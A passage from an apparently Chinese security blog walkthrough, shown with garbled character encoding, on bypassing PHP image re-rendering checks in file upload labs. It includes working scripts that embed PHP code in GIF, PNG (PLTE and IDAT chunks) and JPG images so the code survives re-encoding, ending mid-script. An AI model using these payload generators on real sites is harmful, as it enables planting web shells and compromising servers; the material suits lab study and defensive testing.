class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆæ˜¯åˆ¤æ–­ Content-Typeï¼Œç„¶åå†ç”¨<code>imagecreatefrom[gif|png|jpg]</code>å‡½æ•°åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡æ ¼å¼ï¼Œå¦‚æœæ˜¯å›¾ç‰‡çš„è¯å†ç”¨<code>image[gif|png|jpg]</code>å‡½æ•°å¯¹å…¶è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡æ–‡ä»¶ï¼Œè§‚å¯Ÿå…¶ä¸Šä¼ å‰å’Œä¸Šä¼ åå›¾ç‰‡çš„äºŒè¿›åˆ¶æµæ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œæ¯”å¦‚æˆ‘ç”¨copyå‘½ä»¤ç”Ÿæˆäº†shell.jpgï¼Œç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥çœ‹åˆ°æ–‡ä»¶æœ«å°¾æœ‰æˆ‘ä»¬åŠ å…¥çš„phpè¯­å¥ï¼Œå°†å…¶ä¸Šä¼ ï¼Œå°†æœåŠ¡å™¨ä¿å­˜çš„å³è¢«äºŒæ¬¡æ¸²æŸ“è¿‡çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ã€‚å°†è¢«äºŒæ¬¡æ¸²æŸ“è¿‡çš„å›¾ç‰‡ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°å›¾ç‰‡çš„å¤§å°å¤§å¹…å‡å°ï¼Œä¸”å‰é¢åŠ å…¥çš„PHPä»£ç ä¹Ÿä¸è§äº†ã€‚</p><p>ç»•è¿‡æ–¹æ³•</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>gifäºŒæ¬¡æ¸²æŸ“ç»•è¿‡è¯´æ˜¯æœ€ç®€å•çš„ã€‚å°†æºæ–‡ä»¶å’ŒäºŒæ¬¡æ¸²æŸ“è¿‡çš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œæ‰¾å‡ºæºæ–‡ä»¶ä¸­æ²¡æœ‰è¢«ä¿®æ”¹çš„é‚£æ®µåŒºåŸŸï¼Œåœ¨é‚£æ®µåŒºåŸŸå†™å…¥phpä»£ç å³å¯ã€‚ç”¨UEçš„æ¯”è¾ƒåŠŸèƒ½ï¼Œå¯ä»¥è¿…é€Ÿæ‰¾åˆ°ä¸¤è€…åŒ¹é…çš„åœ°æ–¹ã€‚åœ¨åŒ¹é…å¤„å†™å…¥phpä»£ç å³å¯ã€‚</p><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><p>pngçš„æ–‡ä»¶ç»„æˆå‚è€ƒ <a href="https://www.52hertz.tech/2019/11/14/png%E6%96%87%E4%BB%B6%E7%BB%84%E6%88%90">å¦ä¸€ç¯‡åšå®¢</a>ï¼Œä¹Ÿæ˜¯é€šè¿‡å‚è€ƒæ–‡ç« æ•´ç†å‡ºæ¥çš„ã€‚</p><h3 id="å†™å…¥PLTEæ•°æ®å—"><a href="#å†™å…¥PLTEæ•°æ®å—" class="headerlink" title="å†™å…¥PLTEæ•°æ®å—"></a>å†™å…¥PLTEæ•°æ®å—</h3><p>phpåº•å±‚åœ¨å¯¹PLTEæ•°æ®å—éªŒè¯çš„æ—¶å€™,ä¸»è¦è¿›è¡Œäº†CRCæ ¡éªŒ.æ‰€ä»¥å¯ä»¥å†chunk dataåŸŸæ’å…¥phpä»£ç ,ç„¶åé‡æ–°è®¡ç®—ç›¸åº”çš„crcå€¼å¹¶ä¿®æ”¹å³å¯.</p><p>è¿™ç§æ–¹å¼åªé’ˆå¯¹ç´¢å¼•å½©è‰²å›¾åƒçš„pngå›¾ç‰‡æ‰æœ‰æ•ˆ,åœ¨é€‰å–pngå›¾ç‰‡æ—¶å¯æ ¹æ®IHDRæ•°æ®å—çš„color typeè¾¨åˆ«.<code>03</code>ä¸ºç´¢å¼•å½©è‰²å›¾åƒ.</p><ol><li><p>åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç .</p><p><img src="https://s2.ax1x.com/2020/02/09/1WObmF.png" alt="1WObmF.png"></p></li><li><p>è®¡ç®—PLTEæ•°æ®å—çš„CRCï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><br>png = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;2.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>a = png.read()<br>png.close()<br>hexstr = binascii.b2a_hex(a)<br><br><span class="hljs-string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br>data =  <span class="hljs-string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="hljs-string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="hljs-number">0</span>]<br>crc = binascii.crc32(data[:-<span class="hljs-number">16</span>].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(crc)<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">526579b0</span><br></code></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹CRCå€¼</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOqw4.png" alt="1WOqw4.png"></p></li><li><p>éªŒè¯</p><p>å°†ä¿®æ”¹åçš„pngå›¾ç‰‡ä¸Šä¼ å,ä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOXk9.png" alt="1WOXk9.png"></p></li></ol><h3 id="å†™å…¥IDATæ•°æ®å—"><a href="#å†™å…¥IDATæ•°æ®å—" class="headerlink" title="å†™å…¥IDATæ•°æ®å—"></a>å†™å…¥IDATæ•°æ®å—</h3><p>å›½å¤–å¤§ç‰›å†™çš„è„šæœ¬ï¼Œç›´æ¥æ‹¿æ¥è¿è¡Œå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œåå¾—åˆ°1.png.ä¸Šä¼ åä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€å¦‚ä¸‹å›¾</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOLTJ.png" alt="1WOLTJ.png"></p><h2 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h2><p>å›½å¤–å¤§ç‰›ç¼–å†™çš„è„šæœ¬jpg_payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span 